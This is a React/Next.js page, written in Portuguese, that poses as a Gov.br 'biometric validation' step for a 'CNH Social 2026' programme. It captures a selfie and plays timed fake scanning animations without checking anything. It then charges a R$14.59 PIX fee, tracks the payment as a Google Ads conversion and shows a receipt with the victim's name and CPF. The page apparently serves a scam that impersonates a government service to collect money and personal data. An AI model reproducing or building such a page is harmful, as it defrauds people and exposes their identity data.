'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import Footer from '@/components/Footer';
import { useAuth } from '@/contexts/AuthContext';
import { Copy, Check } from 'lucide-react';

export default function ValidacaoBiometricaPage() {
  const router = useRouter();
  const { user } = useAuth();
  const [currentStep, setCurrentStep] = useState<'idle' | 'camera' | 'approximating' | 'scanning' | 'payment' | 'success'>('idle');
  const [capturedImage, setCapturedImage] = useState<string | null>(null);
  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  
  // Estados do pagamento PIX
  const [pixCode, setPixCode] = useState('');
  const [qrCodeImage, setQrCodeImage] = useState('');
  const [transactionId, setTransactionId] = useState('');
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [pagamentoConfirmado, setPagamentoConfirmado] = useState(false);
  
  const transacaoIniciadaRef = useRef(false);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Capturar UTMs do localStorage
  const getUtmParams = () => {
    if (typeof window === 'undefined') return {};
    const savedUtm = localStorage.getItem('utmParams');
    if (savedUtm) {
      return JSON.parse(savedUtm);
    }
    return {};
  };

  // Verificar se usuário já pagou ao carregar
  useEffect(() => {
    if (typeof window !== 'undefined' && user) {
      const validacaoPaga = localStorage.getItem('validacaoBiometricaPaga');
      if (validacaoPaga) {
        const dados = JSON.parse(validacaoPaga);
        // Verificar se é o mesmo CPF
        if (dados.cpf === user.cpf && dados.pago) {
          console.log('✅ Usuário já pagou validação biométrica');
          setCurrentStep('success');
        }
      }
    }
  }, [user]);

  const handleIniciarValidacao = () => {
    setCurrentStep('camera');
  };

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' } 
      });
      setStream(mediaStream);
      if (videoRef) {
        videoRef.srcObject = mediaStream;
      }
    } catch (error) {
      console.error('Erro ao acessar câmera:', error);
    }
  };

  const captureSelfie = () => {
    if (videoRef) {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.videoWidth;
      canvas.height = videoRef.videoHeight;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(videoRef, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg');
        setCapturedImage(imageData);
        
        // Parar câmera
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        // Ir para etapa de aproximação
        setCurrentStep('approximating');
        
        // Após 3 segundos, ir para validação
        setTimeout(() => {
          setCurrentStep('scanning');
          
          // Após 8 segundos, ir para tela de pagamento
          setTimeout(() => {
            setCurrentStep('payment');
          }, 8000);
        }, 3000);
      }
    }
  };

  useEffect(() => {
    if (currentStep === 'camera' && videoRef) {
      startCamera();
    }
    
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [currentStep, videoRef]);


  // Criar transação PIX quando chega na tela de pagamento
  useEffect(() => {
    if (currentStep === 'payment' && !transacaoIniciadaRef.current && user) {
      // Verificar se já existe transação em andamento
      const transactionData = localStorage.getItem('validacaoBiometricaTransaction');
      if (transactionData) {
        try {
          const { transactionId: savedId, qrCode: savedQr, qrCodeImage: savedQrImage } = JSON.parse(transactionData);
          console.log('📦 Recuperando transação do localStorage');
          setTransactionId(savedId);
          setPixCode(savedQr);
          setQrCodeImage(savedQrImage);
          iniciarVerificacaoPagamento(savedId);
          transacaoIniciadaRef.current = true;
        } catch (err) {
          console.error('Erro ao recuperar transação:', err);
          criarTransacaoPIX();
        }
      } else {
        criarTransacaoPIX();
      }
    }
  }, [currentStep, user]);

  const criarTransacaoPIX = async () => {
    if (transacaoIniciadaRef.current) return;
    transacaoIniciadaRef.current = true;

    setLoading(true);

    try {
      const userBasicData = typeof window !== 'undefined' 
        ? JSON.parse(localStorage.getItem('userBasicData') || '{}')
        : {};

      const response = await fetch('/api/validacao-biometrica/criar', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          nome: userBasicData.nome || user?.nome,
          email: userBasicData.email || user?.email,
          cpf: userBasicData.cpf || user?.cpf,
          telefone: userBasicData.telefone || user?.telefone,
          utmParams: getUtmParams()
        })
      });

      const result = await response.json();

      if (result.success) {
        setPixCode(result.qrCode);
        setQrCodeImage(result.qrCodeImage);
        setTransactionId(result.transactionId);
        
        console.log('✅ PIX gerado:', {
          transactionId: result.transactionId,
          hasQrCode: !!result.qrCode,
          hasQrCodeImage: !!result.qrCodeImage
        });
        
        // Salvar no localStorage
        localStorage.setItem('validacaoBiometricaTransaction', JSON.stringify({
          transactionId: result.transactionId,
          qrCode: result.qrCode,
          qrCodeImage: result.qrCodeImage
        }));

        // Iniciar polling
        iniciarVerificacaoPagamento(result.transactionId);
      } else {
        console.error('❌ Erro ao criar PIX:', result);
        alert('Erro ao gerar código PIX. Por favor, tente novamente.');
      }
    } catch (error) {
      console.error('❌ Erro ao criar transação:', error);
      alert('Erro ao conectar com o servidor. Verifique sua conexão e tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  const iniciarVerificacaoPagamento = (txId: string) => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }

    const interval = setInterval(async () => {
      try {
        const utmParams = getUtmParams();
        const response = await fetch('/api/validacao-biometrica/verificar', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ transactionId: txId, utmParams })
        });
        const result = await response.json();

        if (result.success && result.pago) {
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
          }
          
          setPagamentoConfirmado(true);
          
          // Enviar conversão para Google Ads (com proteção contra duplicação)
          if (typeof window !== 'undefined' && (window as any).gtag_report_conversion) {
            (window as any).gtag_report_conversion(txId, 14.59);
          }
          
          // Salvar validação paga no localStorage
          const validacaoPaga = {
            cpf: user?.cpf,
            dataPagamento: new Date().toISOString(),
            transactionId: txId,
            valor: 14.59,
            pago: true
          };
          localStorage.setItem('validacaoBiometricaPaga', JSON.stringify(validacaoPaga));
          localStorage.removeItem('validacaoBiometricaTransaction');
          
          // Ir para tela de sucesso
          setTimeout(() => {
            setCurrentStep('success');
          }, 1500);
        }
      } catch (error) {
        console.error('Erro ao verificar pagamento:', error);
      }
    }, 5000);

    pollingIntervalRef.current = interval;

    // Timeout de 1 hora
    setTimeout(() => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    }, 60 * 60 * 1000);
  };

  const handleCopiarPix = () => {
    navigator.clipboard.writeText(pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Cleanup
  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  return (
    <>
      <div className="bg-gray-50 px-4 py-8">
        <div className="mx-auto w-full max-w-md">
        {/* Logo Gov.br */}
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex h-20 w-32 items-center justify-center">
            <Image
              src="/govbr.svg"
              alt="Logo Gov.br"
              width={140}
              height={60}
              className="h-auto w-full"
            />
          </div>
        </div>

        {/* Estado 1: Tela Inicial */}
        {currentStep === 'idle' && (
          <>
            <div className="mb-6 rounded-lg border bg-white p-6 shadow-sm">
              <h1 className="mb-4 text-center text-2xl font-bold text-gray-900">
                Validação Biométrica
              </h1>
              
              <div className="mb-6 rounded-md bg-blue-50 p-4">
                <p className="text-sm text-blue-800">
                  Para concluir sua inscrição no CNH Social 2026, precisamos validar sua identidade através do reconhecimento facial.
                </p>
              </div>

              <div className="space-y-3 text-sm text-gray-700">
                <p className="flex items-start gap-2">
                  <span className="text-blue-600">•</span>
                  <span>Posicione seu rosto centralizado na tela</span>
                </p>
                <p className="flex items-start gap-2">
                  <span className="text-blue-600">•</span>
                  <span>Certifique-se de estar em um local bem iluminado</span>
                </p>
                <p className="flex items-start gap-2">
                  <span className="text-blue-600">•</span>
                  <span>Remova óculos e acessórios do rosto</span>
                </p>
                <p className="flex items-start gap-2">
                  <span className="text-blue-600">•</span>
                  <span>O processo leva apenas alguns segundos</span>
                </p>
              </div>
            </div>

            <button
              onClick={handleIniciarValidacao}
              className="flex w-full items-center justify-center gap-2 rounded-lg bg-blue-600 px-6 py-4 text-lg font-bold text-white shadow-md transition-colors hover:bg-blue-700"
            >
              <svg className="h-6 w-6" fill="currentColor" viewBox="0 0 20 20">
                <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
                <path fillRule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clipRule="evenodd" />
              </svg>
              Iniciar Validação Facial
            </button>
          </>
        )}

        {/* Estado 2: Captura de Selfie */}
        {currentStep === 'camera' && (
          <div className="rounded-lg border bg-white p-6 shadow-sm">
            <h2 className="mb-6 text-center text-xl font-bold text-gray-900">
              Tire uma selfie
            </h2>
            
            <div className="relative mx-auto mb-6 overflow-hidden rounded-lg" style={{ maxWidth: '400px', aspectRatio: '3/4' }}>
              <video
                ref={setVideoRef}
                autoPlay
                playsInline
                muted
                className="h-full w-full object-cover"
              />
              <div className="absolute inset-0 border-4 border-blue-500/50 rounded-lg pointer-events-none"></div>
            </div>

            <p className="mb-4 text-center text-sm text-gray-600">
              Posicione seu rosto no centro da tela
            </p>

            <button
              onClick={captureSelfie}
              className="flex w-full items-center justify-center gap-2 rounded-lg bg-blue-600 px-6 py-3 text-base font-semibold text-white shadow-md transition-colors hover:bg-blue-700"
            >
              <svg className="h-5 w-5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M4 5a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V7a2 2 0 00-2-2h-1.586a1 1 0 01-.707-.293l-1.121-1.121A2 2 0 0011.172 3H8.828a2 2 0 00-1.414.586L6.293 4.707A1 1 0 015.586 5H4zm6 9a3 3 0 100-6 3 3 0 000 6z" clipRule="evenodd" />
              </svg>
              Capturar Foto
            </button>
          </div>
        )}

        {/* Estado 3: Aproximar Rosto */}
        {currentStep === 'approximating' && (
          <div className="rounded-lg border bg-white p-8 shadow-sm">
            <h2 className="mb-6 text-center text-xl font-bold text-gray-900">
              Aproxime seu rosto da câmera
            </h2>
            
            {capturedImage && (
              <div className="relative mx-auto mb-6 overflow-hidden rounded-lg animate-pulse" style={{ maxWidth: '300px' }}>
                <img src={capturedImage} alt="Selfie capturada" className="h-full w-full object-cover" />
                <div className="absolute inset-0 border-4 border-green-500 rounded-lg animate-pulse"></div>
              </div>
            )}

            <p className="text-center text-sm text-gray-600">
              Aguarde enquanto processamos sua imagem...
            </p>
          </div>
        )}

        {/* Estado 4: Validação em Sistema */}
        {currentStep === 'scanning' && (
          <div className="rounded-lg border bg-white p-8 shadow-sm">
            <h2 className="mb-6 text-center text-xl font-bold text-gray-900">
              Verificando informações biométricas em sistema.
            </h2>
            
            {capturedImage && (
              <div className="relative mx-auto mb-6 overflow-hidden rounded-lg" style={{ maxWidth: '300px' }}>
                <img src={capturedImage} alt="Validando" className="h-full w-full object-cover" />
              </div>
            )}
            
            {/* Face ID Animation */}
            <div className="face-id-wrapper mx-auto mb-6">
              <svg className="face-id-default" enableBackground="new 0 0 91 91" height="91px" viewBox="0 0 91 91" width="91px">
                <g>
                  <path d="M53.561,66.82c-6.977,1.621-15.125,0.238-15.207,0.225c-1.371-0.238-2.668,0.678-2.906,2.043c-0.238,1.367,0.674,2.668,2.041,2.906c0.23,0.041,3.746,0.643,8.297,0.643c2.757,0,5.896-0.221,8.914-0.922c1.352-0.314,2.192-1.666,1.879-3.018S54.912,66.504,53.561,66.82z"/>
                  <path d="M81.23,37.238c-0.004-0.332,0.002-0.662,0.008-0.99c0.01-0.6,0.018-1.199-0.012-1.801c-0.281-5.872-2.088-11.524-5.373-16.801C72.736,12.634,68.6,8.535,63.561,5.46c-5.156-3.146-10.758-4.838-16.649-5.029c-5.744-0.189-11.285,1.043-16.453,3.656c-6.607,3.344-11.824,8.342-15.504,14.854c-2.902,5.145-4.432,10.541-4.551,16.04c-0.082,3.902,0.088,7.844,0.506,11.717c0.723,6.692,2.018,12.549,3.963,17.897c3.328,9.148,9.785,15.926,14.615,20.002c4.035,3.406,7.309,5.098,12.693,5.98c1.221,0.199,2.359,0.297,3.479,0.297c4.856,0,8.603-1.18,11.925-3.311c8.402-5.381,14.986-13.229,18.541-22.092C79.543,56.947,81.213,47.723,81.23,37.238z M54.873,83.334c-4.834,3.098-7.609,2.982-11.88,2.285c-4.133-0.678-6.635-1.797-10.266-4.861c-4.363-3.682-10.184-9.773-13.133-17.879c-1.805-4.965-3.012-10.434-3.689-16.721c-0.395-3.66-0.555-7.385-0.479-11.07c0.102-4.663,1.414-9.264,3.902-13.676c3.184-5.633,7.691-9.953,13.396-12.842c4.111-2.078,8.496-3.133,13.035-3.133c0.328,0,0.656,0.006,0.988,0.016c5.012,0.164,9.789,1.609,14.194,4.299c4.363,2.66,7.943,6.209,10.646,10.549c2.826,4.541,4.381,9.383,4.619,14.389c0.024,0.494,0.017,0.984,0.008,1.475c-0.008,0.375-0.014,0.752-0.01,1.098c-0.017,9.803-1.567,18.418-4.744,26.34C68.293,71.504,62.402,78.512,54.873,83.334z"/>
                  <path d="M42.311,62.016c0.455,0.844,1.32,1.32,2.213,1.32c0.404,0,0.813-0.096,1.191-0.301c2.623-1.416,4.889-2.807,4.984-2.865c1.182-0.729,1.549-2.275,0.822-3.457c-0.729-1.182-2.275-1.549-3.457-0.822c-0.021,0.014-2.236,1.373-4.734,2.724C42.108,59.271,41.653,60.795,42.311,62.016z"/>
                  <path d="M41.139,44.154c0.672,0,1.344-0.27,1.838-0.801c0.947-1.014,0.891-2.604-0.125-3.551c-7.838-7.307-17.375-4.771-21.322-2.412c-1.191,0.713-1.578,2.256-0.867,3.447c0.713,1.189,2.256,1.576,3.447,0.865c0.08-0.049,8.25-4.809,15.316,1.775C39.911,43.93,40.526,44.154,41.139,44.154z"/>
                  <path d="M69.711,37.311c-0.369-0.188-9.098-4.557-16.709-0.723c-6.434,3.236-6.973,10.004-6.816,14.814c0.043,1.358,1.158,2.432,2.508,2.432c0.027,0,0.058-0.002,0.084-0.002c1.388-0.045,2.476-1.205,2.431-2.592c-0.185-5.678,0.992-8.623,4.054-10.164c5.319-2.678,12.102,0.676,12.17,0.711c1.233,0.631,2.743,0.137,3.375-1.096C71.436,39.455,70.945,37.941,69.711,37.311z"/>
                  <path d="M2.84,18.222c1.389,0,2.514-1.125,2.514-2.514V5.437h10.27c1.389,0,2.514-1.125,2.514-2.514c0-1.387-1.125-2.512-2.514-2.512H2.84c-1.387,0-2.512,1.125-2.512,2.512v12.785C0.329,17.097,1.454,18.222,2.84,18.222z"/>
                  <path d="M88.334,0.412H75.551c-1.389,0-2.514,1.125-2.514,2.512c0,1.389,1.125,2.514,2.514,2.514h10.27v10.271c0,1.389,1.125,2.514,2.515,2.514c1.388,0,2.513-1.125,2.513-2.514V2.923C90.846,1.537,89.721,0.412,88.334,0.412z"/>
                  <path d="M15.624,85.768H5.354V75.496c0-1.389-1.125-2.514-2.514-2.514c-1.387,0-2.512,1.125-2.512,2.514v12.785c0,1.387,1.125,2.512,2.512,2.512h12.783c1.389,0,2.514-1.125,2.514-2.512C18.137,86.893,17.012,85.768,15.624,85.768z"/>
                  <path d="M88.334,72.982c-1.389,0-2.514,1.125-2.514,2.514v10.271H75.55c-1.389,0-2.514,1.125-2.514,2.514c0,1.387,1.125,2.512,2.514,2.512h12.783c1.388,0,2.513-1.125,2.513-2.512V75.496C90.846,74.107,89.721,72.982,88.334,72.982z"/>
                </g>
              </svg>
              <div className="scan-bar"></div>
            </div>

          </div>
        )}

        {/* Estado 5: Pagamento */}
        {currentStep === 'payment' && (
          <div className="rounded-lg border bg-white p-6 shadow-sm">
            {/* Cabeçalho com valor */}
            <div className="mb-6 rounded-lg bg-gradient-to-r from-blue-600 to-blue-700 p-6 text-center text-white">
              <p className="mb-1 text-sm font-medium opacity-90">
                Taxa de Validação Biométrica
              </p>
              <p className="text-4xl font-bold">R$ 14,59</p>
              <p className="mt-2 text-xs opacity-75">
                Pagamento único • Válido por 12 meses
              </p>
            </div>

            {loading ? (
              <div className="py-8 text-center">
                <div className="mx-auto h-12 w-12 animate-spin rounded-full border-4 border-gray-200 border-t-blue-600"></div>
                <p className="mt-4 text-sm text-gray-600">Gerando código PIX...</p>
              </div>
            ) : pagamentoConfirmado ? (
              <div className="rounded-lg border-2 border-green-500 bg-green-50 p-6 text-center">
                <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-green-100">
                  <Check className="h-10 w-10 text-green-600" />
                </div>
                <h3 className="mb-2 text-lg font-bold text-green-900">Pagamento Confirmado!</h3>
                <p className="text-sm text-green-700">Processando validação biométrica...</p>
              </div>
            ) : pixCode ? (
              <>
                {/* QR Code Visual */}
                {qrCodeImage ? (
                  <div className="mb-6 text-center">
                    <p className="mb-3 text-sm font-medium text-gray-700">
                      Escaneie o QR Code com seu app de pagamento
                    </p>
                    <div className="relative mx-auto max-w-xs">
                      <div className="rounded-lg border-4 border-blue-600 bg-white p-4 shadow-lg">
                        <img 
                          src={qrCodeImage} 
                          alt="QR Code PIX" 
                          className="h-full w-full"
                          onError={(e) => {
                            console.error('Erro ao carregar QR Code:', qrCodeImage);
                            e.currentTarget.style.display = 'none';
                          }}
                        />
                      </div>
                      {/* Indicador de aguardando */}
                      <div className="mt-3 flex items-center justify-center gap-2">
                        <div className="h-2 w-2 animate-pulse rounded-full bg-blue-600"></div>
                        <span className="text-xs font-medium text-blue-600">
                          Aguardando pagamento
                        </span>
                      </div>
                    </div>
                    <p className="mt-4 text-xs text-gray-500">ou use o código PIX abaixo</p>
                  </div>
                ) : (
                  <div className="mb-6 text-center">
                    <p className="text-sm text-gray-600">Use o código PIX abaixo para realizar o pagamento</p>
                  </div>
                )}

                {/* PIX Copia e Cola */}
                <div className="mb-4">
                  <label className="mb-2 block text-sm font-medium text-gray-700">
                    PIX Copia e Cola
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={pixCode}
                      readOnly
                      className="flex-1 rounded-md border border-gray-300 bg-gray-50 px-3 py-2 text-sm font-mono"
                    />
                    <button
                      onClick={handleCopiarPix}
                      className="flex items-center gap-2 rounded-md bg-blue-600 px-4 py-2 text-sm font-semibold text-white transition-colors hover:bg-blue-700"
                    >
                      {copied ? (
                        <>
                          <Check className="h-4 w-4" />
                          Copiado
                        </>
                      ) : (
                        <>
                          <Copy className="h-4 w-4" />
                          Copiar
                        </>
                      )}
                    </button>
                  </div>
                </div>

                {/* Instruções */}
                <div className="rounded-lg bg-blue-50 p-4">
                  <h3 className="mb-3 flex items-center gap-2 text-sm font-bold text-blue-900">
                    <svg className="h-5 w-5" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                    </svg>
                    Como pagar com PIX Copia e Cola
                  </h3>
                  <ol className="space-y-2 text-xs text-blue-800">
                    <li className="flex gap-2">
                      <span className="flex h-5 w-5 flex-shrink-0 items-center justify-center rounded-full bg-blue-200 text-[10px] font-bold text-blue-900">1</span>
                      <span>Copie o código PIX clicando no botão <strong>"Copiar"</strong></span>
                    </li>
                    <li className="flex gap-2">
                      <span className="flex h-5 w-5 flex-shrink-0 items-center justify-center rounded-full bg-blue-200 text-[10px] font-bold text-blue-900">2</span>
                      <span>Abra o app do seu banco ou carteira digital</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="flex h-5 w-5 flex-shrink-0 items-center justify-center rounded-full bg-blue-200 text-[10px] font-bold text-blue-900">3</span>
                      <span>Escolha <strong>PIX Copia e Cola</strong></span>
                    </li>
                    <li className="flex gap-2">
                      <span className="flex h-5 w-5 flex-shrink-0 items-center justify-center rounded-full bg-blue-200 text-[10px] font-bold text-blue-900">4</span>
                      <span>Cole o código e confirme o pagamento de <strong>R$ 14,59</strong></span>
                    </li>
                  </ol>
                </div>

                <div className="mt-4 rounded-lg border border-green-200 bg-green-50 p-3">
                  <p className="text-center text-xs text-green-800">
                    <strong>✓</strong> Após o pagamento, a validação será confirmada automaticamente
                  </p>
                </div>
              </>
            ) : null}
          </div>
        )}

        {/* Estado 6: Sucesso */}
        {currentStep === 'success' && (
          <div className="rounded-lg border bg-white p-6 shadow-sm">
            <div className="mb-6 text-center">
              <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
                <Check className="h-12 w-12 text-green-600" strokeWidth={3} />
              </div>
              
              <h2 className="mb-2 text-2xl font-bold text-gray-900">
                Validação Concluída!
              </h2>
              
              <p className="text-sm text-gray-600">
                Sua validação biométrica foi realizada com sucesso
              </p>
            </div>

            {/* Comprovante */}
            <div className="mb-6 rounded-lg border-2 border-green-200 bg-green-50 p-6">
              <h3 className="mb-4 text-center text-lg font-bold text-green-900">
                Comprovante de Validação
              </h3>
              
              <div className="space-y-3">
                <div className="flex justify-between border-b border-green-200 pb-2">
                  <span className="text-sm font-medium text-green-800">Nome</span>
                  <span className="text-sm font-semibold text-green-900">
                    {user?.nome}
                  </span>
                </div>
                <div className="flex justify-between border-b border-green-200 pb-2">
                  <span className="text-sm font-medium text-green-800">CPF</span>
                  <span className="text-sm font-semibold text-green-900">
                    {user?.cpf}
                  </span>
                </div>
                <div className="flex justify-between border-b border-green-200 pb-2">
                  <span className="text-sm font-medium text-green-800">Data</span>
                  <span className="text-sm font-semibold text-green-900">
                    {new Date().toLocaleDateString('pt-BR', {
                      day: '2-digit',
                      month: '2-digit',
                      year: 'numeric',
                      hour: '2-digit',
                      minute: '2-digit'
                    })}
                  </span>
                </div>
                <div className="flex justify-between border-b border-green-200 pb-2">
                  <span className="text-sm font-medium text-green-800">Valor Pago</span>
                  <span className="text-sm font-bold text-green-900">R$ 14,59</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-sm font-medium text-green-800">Status</span>
                  <span className="rounded-full bg-green-600 px-3 py-1 text-xs font-bold text-white">
                    CONFIRMADO
                  </span>
                </div>
              </div>
            </div>

            <button
              onClick={() => router.push('/')}
              className="w-full rounded-lg bg-blue-600 px-6 py-3 text-base font-semibold text-white shadow-sm transition-colors hover:bg-blue-700"
            >
              Voltar para Início
            </button>
          </div>
        )}

        </div>
      </div>
      
      <Footer />

      <style jsx>{`
        .face-id-wrapper {
          height: 200px;
          position: relative;
          width: 200px;
        }

        .face-id-wrapper svg {
          fill: #aaa;
          height: 100%;
          left: 50%;
          position: absolute;
          top: 50%;
          transform: translateX(-50%) translateY(-50%);
          transition: opacity 0.3s ease-in-out 0.2s;
          width: 100%;
        }

        svg.face-id-error {
          fill: #f44336;
        }

        .scan-bar {
          height: 100%;
          position: absolute;
          transition: opacity 0.2s ease;
          width: 100%;
        }

        .scan-bar:before {
          background: #03a9f4;
          border: 1px solid #9adefe;
          border-radius: 5px;
          box-shadow: 2px 2px 3px rgba(51, 51, 51, 0.3);
          content: "";
          height: 8px;
          left: 50%;
          position: absolute;
          top: 50%;
          transform: translateX(-50%) translateY(-50%);
          width: 110%;
          z-index: 2;
          animation: scanning 2s linear infinite;
        }

        @keyframes scanning {
          0% { transform: translateX(-50%) translateY(-120%); }
          50% { transform: translateX(-50%) translateY(50%); }
          100% { transform: translateX(-50%) translateY(120%); }
        }

        .face-id-wrapper.scan-error .face-id-error {
          opacity: 1;
        }

        .face-id-wrapper.scan-error .scan-bar {
          opacity: 0;
          visibility: hidden;
        }
      `}</style>
    </>
  );
}
